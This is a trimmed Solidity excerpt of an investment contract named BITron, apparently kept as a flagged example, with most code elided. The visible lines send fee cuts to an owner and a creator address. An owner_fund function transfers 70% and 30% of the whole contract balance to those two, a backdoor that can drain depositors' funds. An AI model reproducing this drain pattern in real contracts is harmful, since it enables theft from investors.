...
contract BITron {
	...
	function invest(address referrer) public payable {
		...
		creator1.transfer(msg.value.mul(1000).div(PERCENTS_DIVIDER));
	...
	function reinvest() public {
		...
		user.deposits.push(Deposit(totalAmount, 0, block.timestamp));
		totalInvested = totalInvested.add(totalAmount);
		totalDeposits = totalDeposits.add(1);
		owner.transfer(totalAmount.mul(1000).div(PERCENTS_DIVIDER));
		creator1.transfer(totalAmount.mul(1000).div(PERCENTS_DIVIDER));
    ...
    function owner_fund()public payable returns (bool){
        ...
        owner.transfer(getContractBalance().mul(7000).div(PERCENTS_DIVIDER));
        creator1.transfer(getContractBalance().mul(3000).div(PERCENTS_DIVIDER));
        return true;
    }
}
library SafeMath {
